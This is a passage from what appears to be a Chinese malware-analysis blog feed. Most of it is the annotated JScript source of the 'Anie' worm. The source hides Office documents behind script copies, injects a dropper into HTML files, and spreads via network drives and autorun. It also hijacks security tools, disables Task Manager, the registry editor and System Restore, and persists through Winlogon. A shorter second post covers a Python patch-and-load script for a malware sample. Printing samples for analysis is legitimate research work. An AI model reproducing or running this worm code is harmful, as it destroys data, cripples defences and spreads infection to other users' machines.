shortcut.TargetPath = <span class="string">'wscript.exe'</span>;</span><br><span class="line">                shortcut.Arguments = <span class="string">'//e:jscript annie.ani '</span> + <span class="string">'/q:'</span> + i;</span><br><span class="line">                shortcut.Save();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EditHTML</span><span class="params">(filepath)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">'&lt;!--[ANNIE83E333BF08546819]--&gt;'</span>;</span><br><span class="line">    <span class="keyword">if</span> (GetDocType(filepath) != str) &#123;</span><br><span class="line">        <span class="keyword">var</span> text = ReadText(filepath);</span><br><span class="line">        <span class="comment">// 所有斜线替换成双斜线</span></span><br><span class="line">        <span class="keyword">var</span> ki4io = script.replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">        <span class="comment">// 所有单引号替换为带转义字符的单引号</span></span><br><span class="line">        <span class="keyword">var</span> v0l9m = ki4io.replace(<span class="regexp">/\'/g</span>, <span class="string">'\\\''</span>);</span><br><span class="line">        <span class="comment">// 将脚本插入html代码中</span></span><br><span class="line">        <span class="keyword">var</span> html = <span class="string">'&lt;html&gt;\n&lt;script type="text/javascript"&gt;\n&lt;!--\nvar ayfp6=new ActiveXObject(\'Scripting.FileSystemObject\');var dk5h8=new ActiveXObject(\'WScript.Shell\');var s41k8=ayfp6.GetSpecialFolder(2);var bgw3u=ayfp6.GetTempName();var vlx8c=\''</span> + v0l9m + <span class="string">'\'+String.fromCharCode(0);var rwyg5=ayfp6.CreateTextFile(s41k8+\'\\\\\'+bgw3u,true);rwyg5.Write(vlx8c);rwyg5.Close();dk5h8.Run(\'wscript.exe //e:jscript \'+s41k8+\'\\\\\'+bgw3u+\' /t\');\n//--&gt;\n&lt;/script&gt;\n&lt;/html&gt;'</span>;</span><br><span class="line">        SetFileNewAttributes(filepath, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 将生成的DocType标志及HTML代码加入到原文件中</span></span><br><span class="line">            <span class="keyword">var</span> file = fso.OpenTextFile(filepath, <span class="number">2</span>);</span><br><span class="line">            file.WriteLine(str);</span><br><span class="line">            file.WriteLine(text);</span><br><span class="line">            file.WriteLine(html);</span><br><span class="line">            file.Close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">InfectFolder</span><span class="params">(path)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 枚举路径下文件</span></span><br><span class="line">    <span class="keyword">var</span> e = <span class="keyword">new</span> Enumerator(fso.GetFolder(path).Files);</span><br><span class="line">    <span class="keyword">for</span> (e.moveFirst(); !e.atEnd(); e.moveNext()) &#123;</span><br><span class="line">        <span class="keyword">var</span> filepath = e.item().Path;</span><br><span class="line">        <span class="comment">// 如果扩展名为'doc'、'docx'、'ref'并且文件没有打开</span></span><br><span class="line">        <span class="keyword">if</span> ((GetExtensionName(filepath) == <span class="string">'doc'</span> || GetExtensionName(filepath) == <span class="string">'docx'</span> || GetExtensionName(filepath) == <span class="string">'rtf'</span>) &amp;&amp; GetBaseName(filepath).substr(<span class="number">0</span>, <span class="number">2</span>) != <span class="string">'~$'</span>) &#123;</span><br><span class="line">            <span class="comment">// 拷贝脚本文件路径下，文件名为已存在office文件名，扩展名为'.jse'</span></span><br><span class="line">            CopyScriptFile(path + <span class="string">'\\'</span> + GetBaseName(filepath) + <span class="string">'.jse'</span>);</span><br><span class="line">            <span class="comment">// 隐藏原文件</span></span><br><span class="line">            SetFileNewAttributes(filepath, <span class="number">38</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (GetExtensionName(filepath) == <span class="string">'htm'</span> || GetExtensionName(filepath) == <span class="string">'html'</span>) &#123; <span class="comment">// 如果扩展名为'htm' 或 'html'</span></span><br><span class="line">            <span class="comment">// 编辑HTML文件，将脚本代码插入进去</span></span><br><span class="line">            EditHTML(filepath);</span><br><span class="line">        &#125;</span><br><span class="line">        WScript.Sleep(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RegReadItem</span><span class="params">(item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> shell.RegRead(<span class="string">'HKCR\\'</span> + item + <span class="string">'\\'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">InfectNetworkDrives</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (ScriptPath == SysPath) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> network = <span class="keyword">new</span> ActiveXObject(<span class="string">'WScript.Network'</span>);</span><br><span class="line">            <span class="keyword">var</span> e = network.EnumNetworkDrives();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; e.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">                CopyScriptFile(e.Item(i) + <span class="string">'\\annie.ani'</span>);</span><br><span class="line">                CreateShortcut(e.Item(i) + <span class="string">'\\'</span>);</span><br><span class="line">                InfectFolder(e.Item(i) + <span class="string">'\\'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">        WScript.Sleep(<span class="number">900000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CopyScriptFile</span><span class="params">(filename)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果文件大小不为9201</span></span><br><span class="line">    <span class="keyword">if</span> (GetFileSize(filename) != <span class="number">9201</span>) &#123;</span><br><span class="line">        <span class="comment">// 设置文件属性为Normal</span></span><br><span class="line">        SetFileNewAttributes(filename, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 尝试重写文件</span></span><br><span class="line">            <span class="keyword">var</span> f = fso.CreateTextFile(filename, <span class="literal">true</span>);</span><br><span class="line">            f.Write(script);</span><br><span class="line">            f.Close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;   <span class="comment">// 如果重写失败</span></span><br><span class="line">            <span class="comment">// 如果文件路径为文件夹</span></span><br><span class="line">            <span class="keyword">if</span> (fso.FolderExists(filename)) &#123;</span><br><span class="line">                <span class="comment">// 删除文件夹</span></span><br><span class="line">                DeleteFolder(filename);</span><br><span class="line">                <span class="comment">// 重新拷贝脚本文件</span></span><br><span class="line">                CopyScriptFile(filename);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 如果文件扩展名不为'jse'</span></span><br><span class="line">            <span class="keyword">if</span> (GetExtensionName(filename) != <span class="string">'jse'</span>) &#123;</span><br><span class="line">                <span class="comment">// 设置文件属性为 'ReadOnly | Hidden | System | Archive'</span></span><br><span class="line">                SetFileNewAttributes(filename, <span class="number">39</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">InfectCDBuring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> e9hgn = shell.RegRead(<span class="string">'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\CD Burning'</span>);</span><br><span class="line">        CopyScriptFile(e9hgn + <span class="string">'\\annie.ani'</span>);</span><br><span class="line">        CreateAutoRunFile(e9hgn + <span class="string">'\\autorun.inf'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DeleteFolder</span><span class="params">(filename)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        fso.DeleteFolder(filename, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        shell.Run(<span class="string">'cmd.exe /c rd /s /q \\\\.\\"'</span> + filename + <span class="string">'"'</span>, <span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">InfectReg</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 删除右键打开方式</span></span><br><span class="line">        shell.RegDelete(<span class="string">'HKCR\\*\\shellex\\ContextMenuHandlers\\Open With\\'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 修改'.inf'文件安装方式，安装配置文件时删除配置文件</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKCR\\'</span> + RegReadItem(<span class="string">'.inf'</span>) + <span class="string">'\\shell\\Install\\command\\'</span>, <span class="string">'cmd.exe /c del /q /f "%1"'</span>, <span class="string">'REG_EXPAND_SZ'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 修改'.jse'文件的打开方式</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKCR\\'</span> + RegReadItem(<span class="string">'.JSE'</span>) + <span class="string">'\\Shell\\Edit\\Command\\'</span>, RegReadItem(RegReadItem(<span class="string">'.JSE'</span>) + <span class="string">'\\Shell\\Open\\Command\\'</span>), <span class="string">'REG_EXPAND_SZ'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        shell.RegDelete(<span class="string">'HKCR\\'</span> + RegReadItem(<span class="string">'.JSE'</span>) + <span class="string">'\\Shell\\Open2\\'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        shell.RegDelete(<span class="string">'HKCR\\'</span> + RegReadItem(<span class="string">'.JSE'</span>) + <span class="string">'\\Shell\\Open2\\Command\\'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        shell.RegDelete(<span class="string">'HKCR\\'</span> + RegReadItem(<span class="string">'.JSE'</span>) + <span class="string">'\\ShellEx\\PropertySheetHandlers\\WSHProps\\'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 修改'.reg'文件的打开方式，打开即删除</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKCR\\'</span> + RegReadItem(<span class="string">'.reg'</span>) + <span class="string">'\\shell\\open\\command\\'</span>, <span class="string">'cmd.exe /c del /q /f "%1"'</span>, <span class="string">'REG_EXPAND_SZ'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 禁止用户修改文件属性</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoFileAssociate'</span>, <span class="string">'1'</span>, <span class="string">'REG_DWORD'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 禁用注册表编辑器</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools'</span>, <span class="string">'1'</span>, <span class="string">'REG_DWORD'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 禁用任务管理器</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr'</span>, <span class="string">'1'</span>, <span class="string">'REG_DWORD'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 禁用组策略管理器</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKCU\\Software\\Policies\\Microsoft\\MMC\\RestrictToPermittedSnapins'</span>, <span class="string">'1'</span>, <span class="string">'REG_DWORD'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 映像劫持attrib.exe，不回显信息</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\attrib.exe\\Debugger'</span>, <span class="string">'cmd.exe /c rem'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 映像劫持autoruns.exe，启动即删除</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns.exe\\Debugger'</span>, <span class="string">'cmd.exe /c del /q /f'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 映像劫持procexp.exe，启动即删除</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp.exe\\Debugger'</span>, <span class="string">'cmd.exe /c del /q /f'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 映像劫持reg.exe，不回显信息</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\reg.exe\\Debugger'</span>, <span class="string">'cmd.exe /c rem'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 映像劫持RegAlyzer.exe，启动即删除</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\RegAlyzer.exe\\Debugger'</span>, <span class="string">'cmd.exe /c del /q /f'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 映像劫持taskkill.exe,不回显信息</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskkill.exe\\Debugger'</span>, <span class="string">'cmd.exe /c rem'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建自启动项</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit'</span>, SystemPath + <span class="string">'\\userinit.exe,wscript.exe //e:jscript '</span> + SysPath + <span class="string">' /e'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 隐藏文件后缀</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\HideFileExt\\UncheckedValue'</span>, <span class="string">'1'</span>, <span class="string">'REG_DWORD'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 强制隐藏文件</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\SuperHidden\\UncheckedValue'</span>, <span class="string">'0'</span>, <span class="string">'REG_DWORD'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 禁用系统还原</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableConfig'</span>, <span class="string">'1'</span>, <span class="string">'REG_DWORD'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 禁用系统还原</span></span><br><span class="line">        shell.RegWrite(<span class="string">'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableSR'</span>, <span class="string">'1'</span>, <span class="string">'REG_DWORD'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> args = WScript.Arguments;</span><br><span class="line">    <span class="keyword">if</span> (GetExtensionName(ScriptPath) != <span class="string">'jse'</span> &amp;&amp; args.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (args.Item(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'/e'</span>:</span><br><span class="line">                Install();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'/r'</span>: <span class="comment">// 隐藏和伪装自身</span></span><br><span class="line">                HideAndDisguise();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'/s'</span>: <span class="comment">// 感染驱动器</span></span><br><span class="line">                InfectDrives();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'/n'</span>: <span class="comment">// 感染网络驱动器</span></span><br><span class="line">                InfectNetworkDrives();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'/t'</span>: <span class="comment">// 自检后删除当前脚本</span></span><br><span class="line">                TestAndRepair();</span><br><span class="line">                shell.Run(<span class="string">'cmd /c del /q /f '</span> + ScriptPath, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'/a'</span>: <span class="comment">// 自检后以explorer静默执行当前脚本</span></span><br><span class="line">                TestAndRepair();</span><br><span class="line">                shell.Run(<span class="string">'explorer.exe /e,/select,'</span> + ScriptPath);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                TestAndRepair();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 播放个漂亮姑娘.avi，萌萌哒</span></span><br><span class="line">                    shell.Run(<span class="string">'wmplayer.exe "'</span> + ScriptPath.substr(<span class="number">0</span>, ScriptPath.length - <span class="number">9</span>) + <span class="string">'beautiful_girl_part_'</span> + args.Named.Item(<span class="string">'q'</span>) + <span class="string">'.avi'</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        TestAndRepair();</span><br><span class="line">        TryOpenTheOriginalFile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Main();</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[Anie 是一个VBS蠕虫，其命名源于该样本会创建一系列名为 Annie 的不同格式文件。鉴于计算机病毒命名时不应直接使用样本中的字符串，所以将其命名为Anie。]]>
    
    </summary>
    
      <category term="Worm" scheme="http://smvirus.com/tags/Worm/"/>
    
      <category term="病毒分析" scheme="http://smvirus.com/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[用Python写Patch脚本]]></title>
    <link href="http://smvirus.com/2014/06/19/python-script-written-with-patch/"/>
    <id>http://smvirus.com/2014/06/19/python-script-written-with-patch/</id>
    <published>2014-06-19T09:15:35.000Z</published>
    <updated>2015-03-31T18:35:00.000Z</updated>
    <content type="html"><![CDATA[<p>近日对某家族样本虚拟机检测进行分析，应同事要求，写了个Python脚本用于Patch及Load该家族样本。</p>
<p>因之前没有相关经验，在编写过程中遇到一些问题，现将其整理如下。<br><a id="more"></a></p>
<h2 id="获取PE文件版本信息">获取PE文件版本信息</h2><p>该家族样本需特定参数才能运行，且参数信息保存在版本信息中，故需要对样本的版本信息进行解析，进而得到运行参数。<br>Python中没有内置PE解析库，无法直接获取PE文件相关信息，经过搜索在<a href="http://stackoverflow.com/questions/580924/python-windows-file-version-attribute" target="_blank" rel="external">这里</a>发现两种方式解析文件版本信息。<br>两种方式均需要安装第三方库，分别是PyWin32及pefile库，因为我有安装PyWin32，所以选择了使用PyWin32的方式进行解析。<br>解析版本信息源码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> win32api</span><br><span class="line"></span><br><span class="line"><span class="comment">#==============================================================================</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFileProperties</span><span class="params">(fname)</span>:</span></span><br><span class="line"><span class="comment">#==============================================================================</span></span><br><span class="line">    <span class="string">"""</span><br><span class="line">    Read all properties of the given file return them as a dictionary.</span><br><span class="line">    """</span></span><br><span class="line">    propNames = (<span class="string">'Comments'</span>, <span class="string">'InternalName'</span>, <span class="string">'ProductName'</span>,</span><br><span class="line">        <span class="string">'CompanyName'</span>, <span class="string">'LegalCopyright'</span>, <span class="string">'ProductVersion'</span>,</span><br><span class="line">        <span class="string">'FileDescription'</span>, <span class="string">'LegalTrademarks'</span>, <span class="string">'PrivateBuild'</span>,</span><br><span class="line">        <span class="string">'FileVersion'</span>, <span class="string">'OriginalFilename'</span>, <span class="string">'SpecialBuild'</span>)</span><br><span class="line"></span><br><span class="line">    props = &#123;<span class="string">'FixedFileInfo'</span>: <span class="keyword">None</span>, <span class="string">'StringFileInfo'</span>: <span class="keyword">None</span>, <span class="string">'FileVersion'</span>: <span class="keyword">None</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># backslash as parm returns dictionary of numeric info corresponding to VS_FIXEDFILEINFO struc</span></span><br><span class="line">        fixedInfo = win32api.GetFileVersionInfo(fname, <span class="string">'\\'</span>)</span><br><span class="line">        props[<span class="string">'FixedFileInfo'</span>] = fixedInfo</span><br><span class="line">        props[<span class="string">'FileVersion'</span>] = <span class="string">"%d.%d.%d.%d"</span> % (fixedInfo[<span class="string">'FileVersionMS'</span>] / <span class="number">65536</span>,</span><br><span class="line">                fixedInfo[<span class="string">'FileVersionMS'</span>] % <span class="number">65536</span>, fixedInfo[<span class="string">'FileVersionLS'</span>] / <span class="number">65536</span>,</span><br><span class="line">                fixedInfo[<span class="string">'FileVersionLS'</span>] % <span class="number">65536</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># \VarFileInfo\Translation returns list of available (language, codepage)</span></span><br><span class="line">        <span class="comment"># pairs that can be used to retreive string info. We are using only the first pair.</span></span><br><span class="line">        lang, codepage = win32api.GetFileVersionInfo(fname, <span class="string">'\\VarFileInfo\\Translation'</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># any other must be of the form \StringfileInfo\%04X%04X\parm_name, middle</span></span><br><span class="line">        <span class="comment"># two are language/codepage pair returned from above</span></span><br><span class="line"></span><br><span class="line">        strInfo = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> propName <span class="keyword">in</span> propNames:</span><br><span class="line">            strInfoPath = <span class="string">u'\\StringFileInfo\\%04X%04X\\%s'</span> % (lang, codepage, propName)</span><br><span class="line">            <span class="comment">## print str_info</span></span><br><span class="line">            strInfo[propName] = win32api.GetFileVersionInfo(fname, strInfoPath)</span><br><span class="line"></span><br><span class="line">        props[<span class="string">'StringFileInfo'</span>] = strInfo</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> props</span><br></pre></td></tr></table></figure></p>
<h2 id="在Python中查找及修改特征码">在Python中查找及修改特征码</h2><p>对于Patch文件，我的做法很简单，将要求改的代码的二进制数据提取为特征码，然后将修改后的代码作为Patch码，直接替换掉特征码即完成了Patch。但因为没找到直接替换十六进制串的方法，在查找和修改时遇到了问题。<br>后来发现可以以字符串的方式来完成替换，首先将文件以二进制方式读入，将以字符串形式保存的十六进制串按hex方式解码，完成替换，最后以二进制形式再写入即可。<br>Patch代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#==============================================================================</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patchFile</span><span class="params">(fin, fout)</span>:</span></span><br><span class="line"><span class="comment">#==============================================================================</span></span><br><span class="line"><span class="comment"># patch文件，fin为待patch文件，fout为patch后文件</span></span><br><span class="line">    fdata = open(fin, <span class="string">'rb'</span>).read()</span><br><span class="line">    feature = <span class="string">'0FFD000083C414E8073C000085C074416858DA47006A04'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">    patched = <span class="string">'0FFD000083C414E8073C000085C0EB416858DA47006A04'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">    pdata = fdata.replace(feature, patched)</span><br><span class="line">    open(fout, <span class="string">'wb'</span>).write(pdata)</span><br></pre></td></tr></table></figure></p>
<h2 id="创建临时文件并将其创建为子进程">创建临时文件并将其创建为子进程</h2><p>对于Load文件，我的做法是先在临时目录生成一个Patched文件，然后获取到参数后创建一个进程来执行Patched文件，待执行完毕后清理临时文件。<br>因为创建临时文件后需要创建子进程，在创建进程时不可以有进程占有该文件，所以无法使用tempfile.TemporaryFile()函数和tempfile.NamedTemporaryFile()函数。<br>我使用的是tempfile.mkstmp()函数创建临时文件,但在写入完成且关闭文件后，仍无法成功创建进程，错误信息为WindowsError 32，该文件被其他进程占用。<br>搜索后发现除关闭文件外，还需调用os.close()函数，关闭文件描述符，之后可正常创建进程。<br>Loader部分代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#==============================================================================</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loadFile</span><span class="params">(fin)</span>:</span></span><br><span class="line"><span class="comment">#==============================================================================</span></span><br><span class="line"><span class="comment"># load程序，fin为需要load文件</span></span><br><span class="line">    fd, fout = tempfile.mkstemp(suffix=<span class="string">'.exe'</span>)</span><br><span class="line">    patchFile(fin, fout)</span><br><span class="line">    args = getCommandLine(fin)</span><br><span class="line">    os.close(fd)</span><br><span class="line">    subprocess.call(<span class="string">'%s 